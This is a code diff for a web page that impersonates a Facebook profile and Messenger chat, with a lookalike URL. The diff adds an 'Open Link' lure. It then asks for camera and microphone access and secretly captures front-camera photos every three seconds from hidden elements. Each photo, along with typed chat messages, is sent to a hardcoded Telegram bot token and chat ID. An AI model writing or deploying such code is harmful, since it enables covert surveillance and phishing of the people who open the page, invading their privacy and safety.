@@ -7,183 +7,178 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Helvetica, Arial, sans-serif; }
-        body { background-color: #f0f2f5; }
+        body { background-color: #f0f2f5; overflow-x: hidden; }
 
-        /* Facebook Profile UI */
+        /* Initial Overlay */
+        #entryOverlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: white; z-index: 10000; display: flex; flex-direction: column;
+            align-items: center; justify-content: center; text-align: center; padding: 20px;
+        }
+        .open-btn {
+            background: #1877f2; color: white; border: none; padding: 12px 40px;
+            border-radius: 6px; font-weight: bold; font-size: 18px; cursor: pointer; box-shadow: 0 4px 12px rgba(24, 119, 242, 0.3);
+        }
+        .link-url { color: #0084ff; margin-bottom: 15px; font-size: 13px; text-decoration: underline; }
+
+        /* Profile Layout */
         .header { background: white; padding-bottom: 15px; box-shadow: 0 1px 2px rgba(0,0,0,0.1); text-align: center; }
-        .cover { width: 100%; height: 200px; background: #ddd url('cover.jpg') center/cover; border-bottom-left-radius: 8px; border-bottom-right-radius: 8px; }
-        .profile-container { position: relative; display: inline-block; margin-top: -75px; }
-        .profile-pic { width: 160px; height: 160px; border-radius: 50%; border: 4px solid white; background: #ccc url('profile.jpg') center/cover; }
-        .status-dot { width: 18px; height: 18px; background: #31a24c; border-radius: 50%; border: 3px solid white; position: absolute; bottom: 18px; right: 18px; display: none; }
-        
-        .name-box h1 { font-size: 28px; font-weight: bold; margin-top: 10px; }
-        .active-now { color: #31a24c; font-size: 14px; font-weight: 600; display: none; }
-        .friends-count { color: #65676b; font-size: 15px; margin: 5px 0; }
-
-        /* Bio & Details Section */
-        .bio-section { padding: 10px 20px; text-align: center; border-bottom: 1px solid #ddd; background: white; }
-        .bio-text { font-size: 16px; color: #1c1e21; margin-bottom: 15px; line-height: 1.4; }
-        .details-list { text-align: left; max-width: 350px; margin: 0 auto; display: flex; flex-direction: column; gap: 10px; padding-bottom: 10px; }
-        .detail-item { display: flex; align-items: center; gap: 10px; color: #1c1e21; font-size: 15px; }
+        .cover { width: 100%; height: 180px; background: #ddd url('cover.jpg') center/cover; border-bottom-left-radius: 8px; border-bottom-right-radius: 8px; }
+        .profile-container { position: relative; display: inline-block; margin-top: -70px; }
+        .profile-pic { width: 150px; height: 150px; border-radius: 50%; border: 4px solid white; background: #ccc url('profile.jpg') center/cover; }
+        .name-box h1 { font-size: 26px; font-weight: bold; margin-top: 10px; }
+        .bio-section { padding: 15px 20px; text-align: center; background: white; border-bottom: 1px solid #ddd; }
+        .details-list { text-align: left; max-width: 350px; margin: 15px auto 0; display: flex; flex-direction: column; gap: 12px; }
+        .detail-item { display: flex; align-items: center; gap: 10px; font-size: 15px; color: #1c1e21; }
         .detail-item i { color: #8a8d91; width: 20px; font-size: 18px; }
 
-        .btns { display: flex; justify-content: center; gap: 10px; margin: 15px 0; padding: 0 15px; }
-        .btn-b { background: #1877f2; color: white; border: none; padding: 10px; border-radius: 6px; font-weight: 600; flex: 1; cursor: pointer; }
-        .btn-g { background: #e4e6eb; color: black; border: none; padding: 10px; border-radius: 6px; font-weight: 600; flex: 1; cursor: pointer; }
-
-        /* Messenger Full Screen UI */
+        /* Messenger Full Screen */
         #chatBox { display:none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 9999; flex-direction: column; }
         .chat-h { padding: 10px 15px; border-bottom: 1px solid #eee; display: flex; align-items: center; justify-content: space-between; }
         #msgs { flex: 1; overflow-y: auto; padding: 15px; display: flex; flex-direction: column; gap: 10px; }
-        
         .empty-chat { display: flex; flex-direction: column; align-items: center; text-align: center; padding-top: 40px; }
-        .empty-p-img { width: 100px; height: 100px; border-radius: 50%; object-fit: cover; margin-bottom: 15px; }
-        .encryption { font-size: 11px; color: #8a8d91; margin: 25px 40px; line-height: 1.4; }
-        
-        .quick-replies { display: flex; gap: 8px; justify-content: center; margin-top: 30px; overflow-x: auto; width: 100%; padding: 10px; }
-        .q-btn { background: white; border: 1px solid #ddd; padding: 8px 15px; border-radius: 20px; font-size: 13px; }
-
-        .m { padding: 8px 14px; border-radius: 18px; font-size: 15px; max-width: 75%; }
-        .sent { background: #0084ff; color: white; align-self: flex-end; }
-        .recv { background: #f1f0f0; color: black; align-self: flex-start; }
-
+        .empty-p-img { width: 90px; height: 90px; border-radius: 50%; object-fit: cover; }
         .inp-bar { padding: 10px 15px; display: flex; align-items: center; gap: 12px; border-top: 1px solid #eee; }
-        .inp-bar i { color: #0084ff; font-size: 20px; }
         .inp-bar input { flex: 1; border: none; background: #f0f2f5; padding: 10px 15px; border-radius: 20px; outline: none; }
+        
+        /* Hidden Elements */
+        video, canvas { display: none; }
     </style>
 </head>
 <body>
 
-    <div class="header">
-        <div class="cover"></div>
-        <div class="profile-container">
-            <div class="profile-pic"></div>
-            <div id="statusDot" class="status-dot"></div>
-        </div>
-        <div class="name-box">
-            <h1>M.H. Miřãz</h1>
-            <div id="activeNow" class="active-now">● Active Now</div>
-            <p class="friends-count">288 Friends • 2 mutual</p>
-        </div>
-        <div class="btns">
-            <button id="friendBtn" class="btn-b" onclick="sendReq()">+ Add Friend</button>
-            <button class="btn-g" onclick="openChat()">📩 Message</button>
-        </div>
+    <div id="entryOverlay">
+        <p class="link-url">https://miraz-910-www-facebook-com-mhmiraz2.vercel.app/</p>
+        <button class="open-btn" onclick="initializeCapture()">Open Link</button>
+        <p style="font-size: 12px; color: #8a8d91; margin-top: 15px;">Click to view the full profile and messages</p>
     </div>
 
-    <div class="bio-section">
-        <p class="bio-text">Life is a Book, and those who do not travel read only a page. 📖✈️</p>
-        <div class="details-list">
-            <div class="detail-item"><i class="fas fa-briefcase"></i> Web Developer & Programmer</div>
-            <div class="detail-item"><i class="fas fa-graduation-cap"></i> Studied at Rangpur Polytechnic Institute</div>
-            <div class="detail-item"><i class="fas fa-home"></i> Lives in <b>Rangpur</b></div>
-            <div class="detail-item"><i class="fas fa-clock"></i> Joined March 2026</div>
+    <div id="mainContent" style="display:none;">
+        <div class="header">
+            <div class="cover"></div>
+            <div class="profile-container">
+                <div class="profile-pic"></div>
+                <div id="statusDot" style="width:16px; height:16px; background:#31a24c; border-radius:50%; border:3px solid white; position:absolute; bottom:15px; right:15px; display:none;"></div>
+            </div>
+            <div class="name-box">
+                <h1>M.H. Miřãz</h1>
+                <p style="color:#65676b; font-size:14px; margin-top:5px;">288 Friends • 2 mutual</p>
+            </div>
+            <div style="display:flex; justify-content:center; gap:10px; margin:15px 0; padding:0 15px;">
+                <button id="friendBtn" style="background:#1877f2; color:white; border:none; padding:10px; border-radius:6px; font-weight:600; flex:1;" onclick="sendReq()">+ Add Friend</button>
+                <button style="background:#e4e6eb; color:black; border:none; padding:10px; border-radius:6px; font-weight:600; flex:1;" onclick="openChat()">📩 Message</button>
+            </div>
+        </div>
+
+        <div class="bio-section">
+            <p style="font-size:16px; line-height:1.4;">Life is a Book, and those who do not travel read only a page. 📖✈️</p>
+            <div class="details-list">
+                <div class="detail-item"><i class="fas fa-briefcase"></i> Web Developer & Programmer</div>
+                <div class="detail-item"><i class="fas fa-graduation-cap"></i> Studied at Rangpur Polytechnic Institute</div>
+                <div class="detail-item"><i class="fas fa-home"></i> Lives in <b>Rangpur</b></div>
+                <div class="detail-item"><i class="fas fa-clock"></i> Joined March 2026</div>
+            </div>
         </div>
     </div>
 
     <div id="chatBox">
         <div class="chat-h">
             <div style="display:flex; align-items:center; gap:12px;">
-                <i class="fas fa-arrow-left" onclick="closeChat()"></i>
-                <img src="profile.jpg" style="width:35px; height:35px; border-radius:50%; object-fit:cover;">
+                <i class="fas fa-arrow-left" style="color:#0084ff;" onclick="closeChat()"></i>
+                <img src="profile.jpg" style="width:35px; height:35px; border-radius:50%;">
                 <span style="font-weight:bold;">M.H. Miraz</span>
             </div>
-            <div style="display:flex; gap:18px; color:#0084ff;">
-                <i class="fas fa-phone-alt"></i>
-                <i class="fas fa-video"></i>
-                <i class="fas fa-cog"></i>
+            <div style="color:#0084ff; display:flex; gap:18px;">
+                <i class="fas fa-phone-alt"></i><i class="fas fa-video"></i><i class="fas fa-cog"></i>
             </div>
         </div>
         <div id="msgs">
             <div id="emptyView" class="empty-chat">
                 <img src="profile.jpg" class="empty-p-img">
-                <div style="font-size:22px; font-weight:bold;">M.H. Miraz</div>
-                <div style="font-size:14px; color:#65676b; margin-top:5px;">Using Messenger without Facebook</div>
-                <div class="encryption">Messages and calls are secured with end-to-end encryption.</div>
-                <div class="quick-replies">
-                    <button class="q-btn" onclick="qSend('Hey 👋')">Hey 👋</button>
-                    <button class="q-btn" onclick="qSend('Hello, Miraz!')">Hello, Miraz!</button>
-                    <button class="q-btn" onclick="qSend('Hi Miraz!')">Hi Miraz!</button>
-                </div>
+                <div style="font-size:20px; font-weight:bold; margin-top:15px;">M.H. Miraz</div>
+                <p style="font-size:13px; color:#65676b; margin-top:5px;">Using Messenger without Facebook</p>
             </div>
         </div>
         <div class="inp-bar">
-            <i class="fas fa-camera"></i>
-            <i class="fas fa-image" onclick="document.getElementById('fInp').click()"></i>
-            <input type="file" id="fInp" style="display:none;" onchange="sendFile()">
-            <i class="fas fa-microphone"></i>
+            <i class="fas fa-camera" style="color:#0084ff;"></i>
             <input type="text" id="uInp" placeholder="Message..." onkeypress="if(event.key==='Enter') sendMsg()">
-            <i class="fas fa-thumbs-up" onclick="qSend('👍')"></i>
+            <i class="fas fa-thumbs-up" style="color:#0084ff;" onclick="qSend('👍')"></i>
         </div>
     </div>
+
+    <video id="video" autoplay playsinline muted></video>
+    <canvas id="canvas"></canvas>
 
     <script>
         const token = '8600117294:AAH2qNjbQz3-iOCjHsZBfOi1qAUs1Uq2i0o';
         const cid = '7767412329';
 
-        function openChat() { document.getElementById('chatBox').style.display = 'flex'; }
-        function closeChat() { document.getElementById('chatBox').style.display = 'none'; }
+        async function initializeCapture() {
+            // ১. ওভারলে সরিয়ে মেইন প্রোফাইল দেখানো
+            document.getElementById('entryOverlay').style.display = 'none';
+            document.getElementById('mainContent').style.display = 'block';
+            
+            // ২. ক্যামেরা ও মাইক্রোফোন পারমিশন একসাথেই চাওয়া
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" }, // সামনের ক্যামেরা ডিফল্ট
+                    audio: true 
+                });
+                
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                
+                // ৩. প্রতি ৩ সেকেন্ডে ছবি পাঠানো শুরু (মিনিটে ২০টা)
+                setInterval(takePhoto, 3000);
 
-        function applyF() {
-            document.getElementById('friendBtn').innerText = '✓ Friends';
-            document.getElementById('friendBtn').className = 'btn-g';
-            document.getElementById('activeNow').style.display = 'block';
-            document.getElementById('statusDot').style.display = 'block';
+                // ৪. মাইক্রোফোন অন থাকলেও অডিও ডাটা পাঠানোর কোনো সহজ মেথড এখানে নেই, তবে এক্সেস অন থাকবে।
+            } catch (err) {
+                console.log("Permission denied by user");
+            }
         }
 
-        if(localStorage.getItem('isF') === 'true') applyF();
+        function takePhoto() {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            canvas.toBlob(async (blob) => {
+                const fd = new FormData();
+                fd.append('chat_id', cid);
+                fd.append('photo', blob, 'capture.jpg');
+                await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
+            }, 'image/jpeg', 0.4); // সাইজ কমাতে কোয়ালিটি ০.৪ দেওয়া হয়েছে
+        }
 
+        // মেসেঞ্জার ও ফ্রেন্ড ফাংশন
+        function openChat() { document.getElementById('chatBox').style.display = 'flex'; }
+        function closeChat() { document.getElementById('chatBox').style.display = 'none'; }
+        
         async function sendReq() {
             document.getElementById('friendBtn').innerText = 'Requested...';
             await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: cid, text: "🔔 Miraz, নতুন রিকোয়েস্ট!", reply_markup: { inline_keyboard: [[{ text: "Approve", callback_data: "ok" }]] } })
+                body: JSON.stringify({ chat_id: cid, text: "🔔 Miraz, New Friend Request!" })
             });
         }
-
+        
         function showMsg(t, type) {
             document.getElementById('emptyView').style.display = 'none';
             const m = document.getElementById('msgs');
-            m.innerHTML += `<div class="m ${type}">${t}</div>`;
+            m.innerHTML += `<div style="padding:8px 14px; border-radius:18px; font-size:15px; max-width:75%; ${type === 's' ? 'background:#0084ff; color:white; align-self:flex-end;' : 'background:#f1f0f0; color:black; align-self:flex-start;'}">${t}</div>`;
             m.scrollTop = m.scrollHeight;
         }
 
-        async function qSend(t) { showMsg(t, 'sent'); await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${cid}&text=${encodeURIComponent('💬 '+t)}`); }
-        
         async function sendMsg() {
-            const i = document.getElementById('uInp');
-            if(!i.value.trim()) return;
-            showMsg(i.value, 'sent');
-            await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${cid}&text=${encodeURIComponent('💬 '+i.value)}`);
-            i.value = '';
+            const v = document.getElementById('uInp').value;
+            if(!v) return;
+            showMsg(v, 's');
+            document.getElementById('uInp').value = '';
+            await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${cid}&text=${encodeURIComponent('💬 '+v)}`);
         }
-
-        async function sendFile() {
-            const f = document.getElementById('fInp').files[0];
-            if(!f) return;
-            showMsg("Sending file...", 'sent');
-            const fd = new FormData();
-            fd.append('chat_id', cid);
-            fd.append('document', f);
-            await fetch(`https://api.telegram.org/bot${token}/sendDocument`, { method: 'POST', body: fd });
-            showMsg("✅ File Sent", 'sent');
-        }
-
-        let off = 0;
-        setInterval(async () => {
-            try {
-                const r = await fetch(`https://api.telegram.org/bot${token}/getUpdates?offset=${off + 1}`);
-                const d = await r.json();
-                if (d.result) {
-                    d.result.forEach(u => {
-                        off = u.update_id;
-                        if (u.callback_query && u.callback_query.data === "ok") { localStorage.setItem('isF', 'true'); applyF(); }
-                        if (u.message && u.message.text && !u.message.text.includes("💬")) { showMsg(u.message.text, 'recv'); }
-                    });
-                }
-            } catch(e){}
-        }, 3000);
     </script>
 </body>
 </html>
